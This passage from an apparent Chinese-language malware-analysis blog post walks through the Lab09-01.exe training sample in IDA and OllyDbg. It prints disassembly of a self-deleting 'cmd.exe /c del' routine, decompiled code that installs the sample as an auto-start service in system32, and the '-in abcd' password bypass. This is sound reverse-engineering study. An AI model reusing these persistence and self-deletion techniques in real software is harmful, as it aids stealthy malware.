hModule</span><br><span class="line">.text:0040242A                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:00402430                 push    104h            ; cchBuffer</span><br><span class="line">.text:00402435                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:0040243B                 push    ecx             ; lpszShortPath</span><br><span class="line">.text:0040243C                 lea     edx, [ebp+Filename]</span><br><span class="line">.text:00402442                 push    edx             ; lpszLongPath</span><br><span class="line">.text:00402443                 call    ds:GetShortPathNameA</span><br><span class="line">.text:00402449                 mov     edi, offset aCDel ; &quot;/c del &quot;</span><br><span class="line">.text:0040244E                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:00402454                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402457                 xor     eax, eax</span><br><span class="line">.text:00402459                 repne scasb</span><br><span class="line">.text:0040245B                 not     ecx</span><br><span class="line">.text:0040245D                 sub     edi, ecx</span><br><span class="line">.text:0040245F                 mov     esi, edi</span><br><span class="line">.text:00402461                 mov     eax, ecx</span><br><span class="line">.text:00402463                 mov     edi, edx</span><br><span class="line">.text:00402465                 shr     ecx, 2</span><br><span class="line">.text:00402468                 rep movsd</span><br><span class="line">.text:0040246A                 mov     ecx, eax</span><br><span class="line">.text:0040246C                 and     ecx, 3</span><br><span class="line">.text:0040246F                 rep movsb</span><br><span class="line">.text:00402471                 lea     edi, [ebp+Filename]</span><br><span class="line">.text:00402477                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:0040247D                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402480                 xor     eax, eax</span><br><span class="line">.text:00402482                 repne scasb</span><br><span class="line">.text:00402484                 not     ecx</span><br><span class="line">.text:00402486                 sub     edi, ecx</span><br><span class="line">.text:00402488                 mov     esi, edi</span><br><span class="line">.text:0040248A                 mov     ebx, ecx</span><br><span class="line">.text:0040248C                 mov     edi, edx</span><br><span class="line">.text:0040248E                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402491                 xor     eax, eax</span><br><span class="line">.text:00402493                 repne scasb</span><br><span class="line">.text:00402495                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:00402498                 mov     ecx, ebx</span><br><span class="line">.text:0040249A                 shr     ecx, 2</span><br><span class="line">.text:0040249D                 rep movsd</span><br><span class="line">.text:0040249F                 mov     ecx, ebx</span><br><span class="line">.text:004024A1                 and     ecx, 3</span><br><span class="line">.text:004024A4                 rep movsb</span><br><span class="line">.text:004024A6                 mov     edi, offset aNul ; &quot; &gt;&gt; NUL&quot;</span><br><span class="line">.text:004024AB                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:004024B1                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024B4                 xor     eax, eax</span><br><span class="line">.text:004024B6                 repne scasb</span><br><span class="line">.text:004024B8                 not     ecx</span><br><span class="line">.text:004024BA                 sub     edi, ecx</span><br><span class="line">.text:004024BC                 mov     esi, edi</span><br><span class="line">.text:004024BE                 mov     ebx, ecx</span><br><span class="line">.text:004024C0                 mov     edi, edx</span><br><span class="line">.text:004024C2                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024C5                 xor     eax, eax</span><br><span class="line">.text:004024C7                 repne scasb</span><br><span class="line">.text:004024C9                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:004024CC                 mov     ecx, ebx</span><br><span class="line">.text:004024CE                 shr     ecx, 2</span><br><span class="line">.text:004024D1                 rep movsd</span><br><span class="line">.text:004024D3                 mov     ecx, ebx</span><br><span class="line">.text:004024D5                 and     ecx, 3</span><br><span class="line">.text:004024D8                 rep movsb</span><br><span class="line">.text:004024DA                 push    0               ; nShowCmd</span><br><span class="line">.text:004024DC                 push    0               ; lpDirectory</span><br><span class="line">.text:004024DE                 lea     eax, [ebp+Parameters]</span><br><span class="line">.text:004024E4                 push    eax             ; lpParameters</span><br><span class="line">.text:004024E5                 push    offset File     ; &quot;cmd.exe&quot;</span><br><span class="line">.text:004024EA                 push    0               ; lpOperation</span><br><span class="line">.text:004024EC                 push    0               ; hwnd</span><br><span class="line">.text:004024EE                 call    ds:ShellExecuteA</span><br><span class="line">.text:004024F4                 push    0               ; int</span><br><span class="line">.text:004024F6                 call    _exit</span><br><span class="line">.text:004024F6 sub_402410      endp</span><br></pre></td></tr></table></figure><p>å¤§ä½“å°±æ˜¯å¾—åˆ°æœ¬åœ°æ–‡ä»¶è·¯å¾„ï¼Œæ‹¼å‡‘å­—ç¬¦ä¸²<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130811300.png" alt="image-20220824130811300"><br>åœ¨æœ¬åœ°å°è¯•å¯ä»¥çœ‹åˆ°æ­¤å‘½ä»¤ä¸ºåˆ é™¤æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶(æ€ªä¸å¾—æ¯æ¬¡ç‚¹å‡»exeæ–‡ä»¶å°±æ²¡äº†ï¼Œè¿˜ä»¥ä¸ºé˜²ç«å¢™åˆ äº†emm)<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130821549.png" alt="image-20220824130821549"><br>è°ƒç”¨SHELL32çš„ShellExecuteå‡½æ•°æ‰§è¡Œæ‹¼æ¥çš„å­—ç¬¦ä¸²ï¼Œä½†ç”±äºå·²åœ¨odä¸­æ‰“å¼€ï¼Œæ‰€ä»¥ä¸ä¼šåˆ é™¤<br><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824130926845.png" alt="image-20220824130926845"><br>æ¥ç€å¾€ä¸‹çœ‹ï¼Œä¼ å…¥å‚æ•°-inåcall 40380f</p></li></ol><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825161450107.png" alt="image-20220825161450107"> </p><p>åœ¨mainå‡½æ•°ä¸­æ‰¾åˆ°__mbscmpç›¸å…³è°ƒç”¨ï¼ˆcallçš„40380fï¼‰ï¼Œæ­¤å‡½æ•°æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰çš„</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824131207556.png" alt="image-20220824131207556"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824131130609.png" alt="image-20220824131130609"> </p><p>æ­¤å‡½æ•°ï¼ˆ40380fï¼‰çš„è¿”å›å€¼ä¸º910000</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825163746134.png" alt="image-20220825163746134">  </p><p>å¯ä»¥çœ‹åˆ°å‚æ•°-c -cc -re- in</p><table><thead><tr><th>å‚æ•°</th><th>åœ°å€</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-in</td><td>.text:00402600</td><td></td></tr><tr><td>-c</td><td></td><td></td></tr><tr><td>-cc</td><td>.text:0x401280</td><td></td></tr><tr><td>-re</td><td></td><td></td></tr></tbody></table><p>æ¥ç€å¾€ä¸‹çœ‹ï¼Œæ·»åŠ -inå‚æ•°åCtrl+F2é‡æ–°è°ƒè¯•</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824132407112.png" alt="image-20220824132407112"></p><p>å¯è§è·³è¿‡åˆ é™¤è‡ªèº«ï¼Œpushå‚æ•°call 402510</p><p>åˆ†æ402510å‡½æ•°ï¼Œå‘ç°å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œæ˜¯å¦ä¸ºabcdçš„æ ¡éªŒ</p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824133448159.png" alt="image-20220824133448159"> </p><p>æ ¡éªŒå¤±è´¥ï¼Œcall 402410å‡½æ•°ï¼Œå°±æ˜¯ä¹‹å‰åˆ é™¤è‡ªèº«çš„å‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824133644854.png" alt="image-20220824133644854"> </p><p>æ”¹å˜å‚æ•°ä¸º-in abcdï¼Œå³å¯è·³è¿‡</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824133848104.png" alt="image-20220824133848104"> </p><p>call 0040380ï¼Œidaåˆ†æä¸º_mbscmpå‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824134418260.png" alt="image-20220824134418260"> </p><p>call 4025B0</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824141400188.png" alt="image-20220824141400188"> </p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824141515577.png" alt="image-20220824141515577"> </p><p>è¯¥å‡½æ•°ä½œç”¨ä¸ºè·å–æ–‡ä»¶åä¸”è¿”å›result&#x3D;0</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824142219767.png" alt="image-20220824142219767"> </p><p>æ¥ç€å¾€ä¸‹èµ°ï¼Œcall 402600 åº”è¯¥æ˜¯æœ€é‡è¦çš„å¯¹åº”å‚æ•°å‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824142336628.png" alt="image-20220824142336628"> </p><p>å¯ä»¥çœ‹åˆ°æ‰€ä¼ å‚æ•°ä¸º4025B0çš„è¿”å›å€¼ï¼ˆå³å½“å‰æ–‡ä»¶æ–‡ä»¶åï¼‰</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825164520644.png" alt="image-20220825164520644"> </p><p>è·Ÿè¿›åçœ‹åˆ°calläº†_alloca_probeï¼ˆå¯èƒ½ä¸æ³¨å†Œå†…å­˜æœ‰å…³ï¼Œå…ˆä¸ç®¡ï¼‰å’Œ4025b0ï¼ˆå…ˆå‰åˆ†æè¿‡ä¸ºæˆªå–æ–‡ä»¶åï¼‰</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825165228995.png" alt="image-20220825165228995"> </p><p> æ¥ç€è·Ÿè¿›å‘ç°è·³è½¬åˆ°402632ï¼Œå‘ç°æ­¤å‡½æ•°å‰éƒ¨åˆ†æ˜¯å®ç°æ‹¼æ¥å­—ç¬¦ä¸²%SYSTEMROOT%\system32\Lab09-01.exeçš„æ“ä½œï¼Œç„¶åè°ƒç”¨OpenScManagerA</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825165810548.png" alt="image-20220825165810548"> </p><p>å¯ä»¥OpenScManagerAä¼ å…¥å‚æ•°ä¸º3ä¸ªç«‹å³æ•°ï¼Œä¹‹å‰åˆ†æçŸ¥é“å®ƒè¿”å›ä¸€ä¸ªæœåŠ¡æ§åˆ¶ç®¡ç†å™¨å¥æŸ„ï¼Œæ‰€æœ‰è¦å’ŒæœåŠ¡äº¤äº’çš„ä»£ç ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼›</p><p>å¯¹äºè¿™ç§å®˜æ–¹APIå‡½æ•°å¯ä»¥è·³è¿‡</p><p>æ¥ç€è°ƒç”¨OpenServiceå‡½æ•°ï¼Œå‚æ•°ä¸ºè‡ªèº«æ–‡ä»¶åï¼Œå¯ä»¥åˆ¤æ–­å¼€å¯ä¸€ä¸ªè‡ªèº«æœåŠ¡</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170308202.png" alt="image-20220825170308202"> </p><p>æ¥ç€è°ƒç”¨ChangeServiceConfigAå’ŒCloseServiceå‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170611821.png" alt="image-20220825170611821"> </p><p>å…¶ä¸­ChangeServiceConfigAæ‰€ä¼ å‚æ•°å¦‚ä¸‹ï¼ŒhServiceä¸ºä¹‹å‰å¼€å¯çš„è‡ªèº«æœåŠ¡</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825170736958.png" alt="image-20220825170736958"> </p><p>å†å¾€ä¸‹å‘ç°å°±è·³å‡ºäº†402600å‡½æ•°ï¼Œå› æ­¤å¯ä»¥æ¨æ–­-inå‚æ•°ä¸ºåˆ›å»ºæœåŠ¡åŠŸèƒ½ï¼Œida F5ä¼ªä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402600</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-1408h]@5</span></span><br><span class="line">  SC_HANDLE hServicea; <span class="comment">// [sp+Ch] [bp-1408h]@9</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+10h] [bp-1404h]@1</span></span><br><span class="line">  CHAR Filename; <span class="comment">// [sp+410h] [bp-1004h]@14</span></span><br><span class="line">  CHAR DisplayName; <span class="comment">// [sp+810h] [bp-C04h]@9</span></span><br><span class="line">  CHAR BinaryPathName; <span class="comment">// [sp+C10h] [bp-804h]@6</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+1010h] [bp-404h]@3</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+1014h] [bp-400h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_4025B0(&amp;v4) ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);  <span class="comment">//aSystemrootSyst==%SYSTEMROOT%\system32\</span></span><br><span class="line"><span class="comment">  strcat(&amp;Src, &amp;v4);</span></span><br><span class="line">  <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);  <span class="comment">//è°ƒç”¨OpenSCManagerAï¼Œæ‰“å¼€ä¸€ä¸ªæœåŠ¡ç®¡ç†å™¨ï¼Œ</span></span><br><span class="line">  <span class="keyword">if</span> ( !hSCManager )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u); <span class="comment">//æœåŠ¡å³è‡ªèº«exeï¼Œåˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œ</span></span><br><span class="line">  <span class="keyword">if</span> ( hService ) <span class="comment">//å¦‚æœæœåŠ¡å·²ç»åˆ›å»ºæ‰“å¼€æœåŠ¡</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ChangeServiceConfigA(hService, <span class="number">0xFFFFFFFF</span>, <span class="number">2u</span>, <span class="number">0xFFFFFFFF</span>, &amp;BinaryPathName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;     <span class="comment">//å¹¶æ·»åŠ è¿›å¯åŠ¨é¡¹</span></span><br><span class="line">      CloseServiceHandle(hService);</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hService);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;DisplayName, lpServiceName);</span><br><span class="line">    <span class="built_in">strcat</span>(&amp;DisplayName, aManagerService);  <span class="comment">//åˆ›å»ºä¸€ä¸ªæœåŠ¡</span></span><br><span class="line">    hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, <span class="number">0xF01FF</span>u, <span class="number">0x20</span>u, <span class="number">2u</span>, <span class="number">1u</span>, &amp;Src, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !hServicea )</span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hServicea);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, <span class="number">0x400</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x400</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( CopyFileA(&amp;Filename, &amp;BinaryPathName, <span class="number">0</span>) ) <span class="comment">//å°†è‡ªå·±å¤åˆ¶åˆ° %SYSTEMROOT%\\system32\\xxxï¼Œå³å†™è¿›system32ç›®å½•</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_4015B0(&amp;BinaryPathName) )</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          result = sub_401070(aUps, aHttpWww_practi, a80, a60) != <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å·²å¯åŠ¨è‡ªèº«æœåŠ¡</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220824143845843.png" alt="image-20220824143845843"> </p><p>è‡³æ­¤ï¼Œ-inå‚æ•°åˆ†æç»“æŸ</p><p>æ¥ç€åˆ†æ-reå‚æ•°</p><p>ä¿®æ”¹å‚æ•°ä¸º-re abcd</p><p>ç»è¿‡_mbscmpå‡½æ•°åeaxè¿”å›å€¼ä¸º1ï¼Œè·³è½¬åˆ°-reå‚æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825171533060.png" alt="image-20220825171533060"> </p><p>æ¥ç€å’Œ-inå‚æ•°ä¸€æ ·call 40380fæ¯”è¾ƒå­—ç¬¦ä¸²,call 4025b0è·å–æ–‡ä»¶å</p><p>æ¥ç€call 402900è¿›å…¥-reå‚æ•°å‡½æ•°</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173245851.png" alt="image-20220825173245851"> </p><p>åæ±‡ç¼–æŸ¥çœ‹ä»£ç ,åˆæ­¥åˆ¤æ–­ä¸ºåˆ é™¤æœåŠ¡çš„ï¼Œodè·Ÿè¿›çœ‹çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402900</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-C08h]@3</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [sp+10h] [bp-C04h]@7</span></span><br><span class="line">  CHAR Dst; <span class="comment">// [sp+410h] [bp-804h]@9</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+810h] [bp-404h]@1</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+814h] [bp-400h]@9</span></span><br><span class="line"></span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( hSCManager )</span><br><span class="line">  &#123;</span><br><span class="line">    hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( hService )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( DeleteService(hService) )</span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        <span class="keyword">if</span> ( sub_4025B0(&amp;v3) )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, &amp;v3);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">          <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, <span class="number">0x400</span>u) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( DeleteFileA(&amp;Dst) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) )</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                result = sub_401210() != <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„æµç¨‹ï¼Œåªä¸è¿‡openæ”¹ä¸ºdeleteService</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173545489.png" alt="image-20220825173545489"> </p><p>è·Ÿè¿›å‘ç°æœåŠ¡å·²ç¦ç”¨</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173934292.png" alt="image-20220825173934292">  </p><p>æ¥ç€deletefile</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173828296.png" alt="image-20220825173828296"> </p><p>åˆ°æ­¤ï¼Œå¯¹äº-reå‚æ•°åŠŸèƒ½çš„åˆ†æå·²ç»ç»“æŸï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯åˆ é™¤æœåŠ¡åŠŸèƒ½ï¼›</p><p>ä¸‹é¢åˆ†æ-cå‚æ•°</p><p>ä¿®æ”¹å‚æ•°ä¸º-c abcd</p><p>è¿›å…¥è°ƒè¯•æ‰§è¡Œï¼Œæ­¤å¤„åº”è¯¥å°±æ˜¯-cå‚æ•°ä»£ç æ®µ</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825195723113.png" alt="image-20220825195723113"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825204505319.png" alt="image-20220825204505319"> </p><p>å¯ä»¥çœ‹åˆ°æœ‰2ä¸ªjnzè·³è½¬(402cd9,402ccf)</p><p>å› ä¸ºå‚æ•°ä¸º-cæ‰€ä»¥402cd9ä¸è·³è½¬ï¼Œæ¥ä¸‹æ¥åˆ†æä¸‹402ccf,odä¸­æ˜¯è·³è½¬äº†çš„</p><p>ç®€å•åæ±‡ç¼–ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸º7</p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825205048492.png" alt="image-20220825205048492"> </p><p>å¦‚æœä¸ä¸º7ï¼Œåˆ™call 402410,ä¹‹å‰åˆ†æè¿‡è¿™ä¸ªå‡½æ•°æ˜¯åˆ é™¤è‡ªèº« </p><p>æ›´æ”¹å‚æ•°å¦‚å›¾ï¼Œå®é™…æŒ‡ä»¤ä¸º(xxxx.exe -c 111 222 333 444 abcd)å…±7ä¸ªå‚æ•°ï¼Œåé‡æ–°è°ƒè¯•</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210040591.png" alt="image-20220825210040591"> </p><p>å¯ä»¥çœ‹åˆ°è¿›å…¥401070å‡½æ•°ï¼Œå¹¶å¯¹è¾“å…¥çš„å‚æ•°111 222 333 444å¤„ç†</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210313255.png" alt="image-20220825210313255"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210515185.png" alt="image-20220825210515185"> </p><p>å‚æ•°å…¥æ ˆåè°ƒç”¨401070,åº”è¯¥å°±æ˜¯-cçš„å‡½æ•°äº†ï¼Œè¿›å…¥çœ‹çœ‹</p><p> å¤§æ¦‚æ„æ€å°±æ˜¯åˆ›å»ºæ³¨å†Œè¡¨keyï¼Œç„¶åè®¾ç½®valueï¼Œä¸€æ­¥ä¸€æ­¥è·Ÿè¿›</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825205316100.png" alt="image-20220825205316100"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210834559.png" alt="image-20220825210834559"> 